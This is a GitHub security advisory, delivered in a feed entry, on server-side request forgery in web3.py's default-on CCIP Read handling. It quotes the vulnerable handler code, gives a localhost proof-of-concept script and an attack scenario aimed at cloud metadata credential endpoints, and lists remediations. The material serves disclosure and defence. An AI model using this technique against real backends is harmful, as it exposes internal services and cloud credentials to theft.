        <title type="html"><![CDATA[[web3] web3.py: SSRF via CCIP Read (EIP-3668) OffchainLookup URL handling]]></title>
        <id>https://github.com/advisories/GHSA-5hr4-253g-cpx2</id>
        <link href="https://github.com/advisories/GHSA-5hr4-253g-cpx2"/>
        <updated>2026-04-04T06:38:12.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>web3.py implements CCIP Read / <code>OffchainLookup</code> (EIP-3668) by performing HTTP requests to URLs supplied by smart contracts in <code>offchain_lookup_payload["urls"]</code>. The implementation uses these contract-supplied URLs directly (after <code>{sender}</code> / <code>{data}</code> template substitution) without any destination validation:</p>
<ul>
<li>No restriction to <code>https://</code> (and no opt-in gate for <code>http://</code>)</li>
<li>No hostname or IP allowlist</li>
<li>No blocking of private/reserved IP ranges (loopback, link-local, RFC1918)</li>
<li>No redirect target validation (both <code>requests</code> and <code>aiohttp</code> follow redirects by default)</li>
</ul>
<p><strong>CCIP Read is enabled by default</strong> (<code>global_ccip_read_enabled = True</code> on all providers), meaning any application using web3.py's <code>.call()</code> method is exposed without explicit opt-in.</p>
<p>This results in <strong>Server-Side Request Forgery (SSRF)</strong> when web3.py is used in backend services, indexers, APIs, or any environment that performs <code>eth_call</code> / <code>.call()</code> against untrusted or user-supplied contract addresses. A malicious contract can force the web3.py process to issue HTTP requests to arbitrary destinations, including internal network services and cloud metadata endpoints.</p>
<hr>
<h2 id="why-this-is-a-vulnerability">Why This Is a Vulnerability</h2>
<p>The argument is not that CCIP Read itself is invalid or that web3.py should stop supporting EIP-3668. The issue is that, in server-side deployments (backends, indexers, bots, APIs), the current implementation doesn't provide destination policy controls, such as a validation/override hook, private-range blocking, or redirect target checks, which means contract controlled CCIP URLs can be used as an SSRF primitive.</p>
<p>This is consistent with EIP-3668's own security considerations, which recommends that client libraries "provide clients with a hook to override CCIP read calls, either by rewriting them to use a proxy service, or by denying them entirely" and that "this mechanism or another should be written so as to easily facilitate adding domains to allowlists or blocklists." The mitigations I'm suggesting are meant to align with that guidance without breaking CCIP Read support.</p>
<ul>
<li><p><strong>Default-on exposure.</strong> CCIP Read is enabled by default on all web3.py providers (<code>global_ccip_read_enabled = True</code>). Users who never intend to use CCIP Read, and who may not even know the feature exists, are silently exposed. A feature that makes unsanitized outbound requests to attacker-controlled URLs should not be enabled by default without safety guardrails.</p>
</li>
<li><p><strong>Library vs. application responsibility.</strong> web3.py is a widely-used library. Expecting every downstream application to independently implement SSRF protections around <code>.call()</code> is unreasonable, especially for a feature that fires automatically and invisibly on a specific revert pattern. Safe defaults at the library level are the standard expectation for any library that issues outbound HTTP requests to externally-controlled URLs.</p>
</li>
</ul>
<hr>
<h2 id="affected-code">Affected Code</h2>
<h3 id="sync-ccip-handler">Sync CCIP handler</h3>
<p><strong>File:</strong> <code>web3/utils/exception_handling.py</code> (lines 42-58)</p>
<p>Contract-controlled URLs are requested via <code>requests</code> with no destination validation:</p>
<pre><code class="language-python">session = requests.Session()
for url in offchain_lookup_payload["urls"]:
    formatted_url = URI(
        str(url)
        .replace("{sender}", str(formatted_sender))
        .replace("{data}", str(formatted_data))
    )

    try:
        if "{data}" in url and "{sender}" in url:
            response = session.get(formatted_url, timeout=DEFAULT_HTTP_TIMEOUT)
        else:
            response = session.post(
                formatted_url,
                json={"data": formatted_data, "sender": formatted_sender},
                timeout=DEFAULT_HTTP_TIMEOUT,
            )
</code></pre>
<p>(The request is issued before response validation; subsequent logic parses JSON and enforces a <code>"data"</code> field.)</p>
<p>Key observations:</p>
<ul>
<li><code>requests</code> follows redirects by default (<code>allow_redirects=True</code>).</li>
<li>No <code>allow_redirects=False</code> is set.</li>
<li>No validation of <code>formatted_url</code> before the request.</li>
<li>The placeholder check (<code>if "{data}" in url</code>) operates on the raw <code>url</code> value from the payload (before <code>str()</code> conversion), not on the already-formatted <code>formatted_url</code>. If <code>url</code> is not a plain <code>str</code> (e.g., a <code>URI</code> type), the <code>in</code> check may behave differently than intended.</li>
</ul>
<h3 id="async-ccip-handler">Async CCIP handler</h3>
<p><strong>File:</strong> <code>web3/utils/async_exception_handling.py</code> (lines 45-63)</p>
<p>Same pattern with <code>aiohttp</code>:</p>
<pre><code class="language-python">session = ClientSession()
for url in offchain_lookup_payload["urls"]:
    formatted_url = URI(
        str(url)
        .replace("{sender}", str(formatted_sender))
        .replace("{data}", str(formatted_data))
    )

    try:
        if "{data}" in url and "{sender}" in url:
            response = await session.get(
                formatted_url, timeout=ClientTimeout(DEFAULT_HTTP_TIMEOUT)
            )
        else:
            response = await session.post(
                formatted_url,
                json={"data": formatted_data, "sender": formatted_sender},
                timeout=ClientTimeout(DEFAULT_HTTP_TIMEOUT),
            )
</code></pre>
<p>Key observations:</p>
<ul>
<li><code>aiohttp</code> follows redirects by default.</li>
<li>No redirect or destination validation.</li>
<li>Same raw-<code>url</code> placeholder check issue as the sync handler.</li>
</ul>
<h3 id="default-on-invocation-path">Default-on invocation path</h3>
<p><strong>File:</strong> <code>web3/providers/base.py</code> (line 66) and <code>web3/providers/async_base.py</code> (line 79):</p>
<pre><code class="language-python">global_ccip_read_enabled: bool = True
</code></pre>
<p><strong>File:</strong> <code>web3/eth/eth.py</code> (lines 222-266) and <code>web3/eth/async_eth.py</code> (lines 243-287):</p>
<p>The <code>.call()</code> method automatically invokes <code>handle_offchain_lookup()</code> / <code>async_handle_offchain_lookup()</code> when a contract reverts with <code>OffchainLookup</code>, up to <code>ccip_read_max_redirects</code> times (default: 4). No user interaction or explicit opt-in is required beyond the default configuration.</p>
<hr>
<h2 id="security-impact">Security Impact</h2>
<h3 id="1-blind-ssrf-primary-impact">1. Blind SSRF (Primary Impact)</h3>
<p>A malicious contract can supply URLs that cause the web3.py process to issue HTTP GET or POST requests to:</p>
<ul>
<li><strong>Loopback services:</strong> <code>http://127.0.0.1:&lt;port&gt;/...</code>, <code>http://localhost/...</code></li>
<li><strong>Cloud metadata endpoints:</strong> <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></li>
<li><strong>Internal network services:</strong> any RFC1918 address (<code>10.x.x.x</code>, <code>172.16-31.x.x</code>, <code>192.168.x.x</code>)</li>
<li><strong>Arbitrary external destinations</strong></li>
</ul>
<p>The request is made from the web3.py process. This alone constitutes SSRF -- the attacker controls the destination of an outbound request from the victim's infrastructure.</p>
<p><strong>Note on response handling:</strong> The CCIP handler expects a JSON response containing a <code>"data"</code> field. If the target endpoint does not return valid JSON with this key, the handler raises <code>Web3ValidationError</code> or continues to the next URL. This means:</p>
<ul>
<li>The raw response body is <strong>not</strong> directly returned to the attacker in most cases (blind SSRF).</li>
<li>However, the request itself is the primary threat: it can reach internal services, trigger side effects on internal APIs, and serve as a network probe.</li>
<li>On AWS with IMDSv1, a GET to <code>http://169.254.169.254/...</code> returns credentials in plaintext. While the CCIP handler would fail to parse this as JSON, the request itself reaches the metadata service. If an internal endpoint returns JSON containing a <code>"data"</code> field (or can be coerced to), the handler may accept it and use it in the on-chain callback, creating a potential exfiltration path.</li>
</ul>
<h3 id="2-redirect-based-ssrf-amplification">2. Redirect-Based SSRF Amplification</h3>
<p>Both <code>requests</code> and <code>aiohttp</code> follow HTTP redirects by default. The CCIP handlers use the final response without validating the final resolved URL.</p>
<ul>
<li><strong>Sync:</strong> <code>web3/utils/exception_handling.py</code> -- <code>session.get()</code> with default <code>allow_redirects=True</code></li>
<li><strong>Async:</strong> <code>web3/utils/async_exception_handling.py</code> -- <code>session.get()</code> with default redirect following</li>
</ul>
<p>A contract-supplied URL can point to an attacker-controlled server that issues a <code>302</code> redirect to <code>http://169.254.169.254/...</code> or any internal endpoint. This defeats naive URL-prefix checks that an application might add, expanding the SSRF surface.</p>
<h3 id="3-internal-network-probing">3. Internal Network Probing</h3>
<p>By varying the URLs supplied in the <code>OffchainLookup</code> revert payload, an attacker can:</p>
<ul>
<li>Probe internal network topology (open ports, reachable hosts) based on response timing and error behavior</li>
<li>Trigger side effects on internal APIs that accept GET or POST requests without authentication</li>
<li>Map cloud infrastructure by querying metadata endpoints</li>
</ul>
<h3 id="4-post-based-ssrf">4. POST-Based SSRF</h3>
<p>When the contract-supplied URL does <strong>not</strong> contain both <code>{sender}</code> and <code>{data}</code> placeholders, the handler switches to <code>session.post()</code> with a JSON body. This means the attacker can cause the victim to issue <strong>POST requests with a controlled JSON body</strong> (<code>{"data": ..., "sender": ...}</code>) to arbitrary destinations, increasing the potential for triggering state-changing operations on internal services.</p>
<hr>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="prerequisites">Prerequisites</h3>
<ul>
<li>Python environment with <code>web3</code> installed</li>
<li>No network access or blockchain connection required (the PoC calls the handler function directly)</li>
</ul>
<h3 id="step-1-start-a-local-http-listener">Step 1: Start a local HTTP listener</h3>
<pre><code class="language-bash">python -m http.server 9999
</code></pre>
<h3 id="step-2-run-the-reproduction-script">Step 2: Run the reproduction script</h3>
<pre><code class="language-bash">python repro_ssrf.py
</code></pre>
<h3 id="step-3-observe">Step 3: Observe</h3>
<p>The HTTP server logs will show an inbound request to a path like <code>/SSRF_DETECTION_SUCCESS?sender=...&amp;data=...</code>, confirming that <code>handle_offchain_lookup()</code> issued an outbound HTTP request to the contract-supplied URL without any destination validation.</p>
<p>The script will then print an error (the local HTTP server does not return the expected JSON), but the request has already been sent -- the SSRF occurs before any response validation.</p>
<h3 id="reproduction-script-repro_ssrfpy">Reproduction script (<code>repro_ssrf.py</code>)</h3>
<pre><code class="language-python">from web3.types import TxParams
from web3.utils.exception_handling import handle_offchain_lookup


def reproduce_ssrf():
    target_address = "0x0000000000000000000000000000000000000001"

    payload = {
        "sender": target_address,
        "callData": "0x1234",
        "callbackFunction": "0x12345678",
        "extraData": "0x90ab",
        "urls": [
            "http://127.0.0.1:9999/SSRF_DETECTION_SUCCESS?sender={sender}&amp;data={data}"
        ],
    }

    transaction: TxParams = {"to": target_address}

    print(f"Triggering CCIP Read handler with URL: {payload['urls'][0]}")

    try:
        handle_offchain_lookup(payload, transaction)
    except Exception as e:
        print(f"Expected failure after request was sent: {e}")


if __name__ == "__main__":
    reproduce_ssrf()
</code></pre>
<h3 id="real-world-attack-scenario">Real-world attack scenario</h3>
<p>In a production setting, the attacker would:</p>
<ol>
<li>Deploy a malicious contract that reverts with <code>OffchainLookup</code>, supplying URLs pointing to internal services (e.g., <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>).</li>
<li>Cause a backend service (indexer, API, bot) to call that contract via <code>eth_call</code> / <code>.call()</code>.</li>
<li>web3.py automatically triggers CCIP Read, issuing the HTTP request from the backend's network context.</li>
</ol>
<p>No special permissions or contract interactions beyond a standard <code>eth_call</code> are required.</p>
<hr>
<h2 id="suggested-remediation">Suggested Remediation</h2>
<h3 id="1-restrict-url-schemes-safe-default">1. Restrict URL schemes (safe default)</h3>
<p>Allow only <code>https://</code> by default. Provide an explicit opt-in flag (e.g., <code>ccip_read_allow_http=True</code>) for <code>http://</code>.</p>
<h3 id="2-block-privatereserved-ip-destinations-by-default">2. Block private/reserved IP destinations by default</h3>
<p>Before issuing the request, resolve the hostname and reject connections to:</p>
<ul>
<li><code>127.0.0.0/8</code> (loopback)</li>
<li><code>169.254.0.0/16</code> (link-local / cloud metadata)</li>
<li><code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code> (RFC1918)</li>
<li><code>::1</code>, <code>fe80::/10</code> (IPv6 loopback / link-local)</li>
<li><code>0.0.0.0/8</code></li>
</ul>
<h3 id="3-disable-or-validate-redirects">3. Disable or validate redirects</h3>
<p>Either:</p>
<ul>
<li>Set <code>allow_redirects=False</code> on the HTTP requests, or</li>
<li>Validate each redirect target against the same destination policy before following it</li>
</ul>
<h3 id="4-provide-a-url-validator-hook">4. Provide a URL validator hook</h3>
<p>Allow users to supply a custom URL validation callback for CCIP Read URLs (e.g., a hostname allowlist, gateway pinning, or custom policy). This enables advanced users to configure CCIP Read for their specific trust model.</p>
<h3 id="5-consider-stronger-default-safety-signaling-or-default-off-in-server-side-contexts">5. Consider stronger default safety signaling (or default-off in server-side contexts)</h3>
<p>EIP-3668 encourages keeping CCIP Read enabled for calls, so this may not be desirable as a universal default change. However, for server-side deployments, consider either:</p>
<ul>
<li>a clearly documented “safe mode” preset (destination validation + redirect checks + private-range blocking), or</li>
<li>stronger warnings / examples showing how to disable CCIP Read (<code>ccip_read_enabled=False</code> or <code>global_ccip_read_enabled=False</code>) when calling untrusted contracts.</li>
</ul>
<p>At minimum, document the SSRF risk prominently in the CCIP Read docs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ethereum/web3.py/security/advisories/GHSA-5hr4-253g-cpx2">https://github.com/ethereum/web3.py/security/advisories/GHSA-5hr4-253g-cpx2</a></li>
<li><a href="https://github.com/advisories/GHSA-5hr4-253g-cpx2">https://github.com/advisories/GHSA-5hr4-253g-cpx2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5hr4-253g-cpx2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-04T06:38:11.000Z</published>
    </entry>
</feed>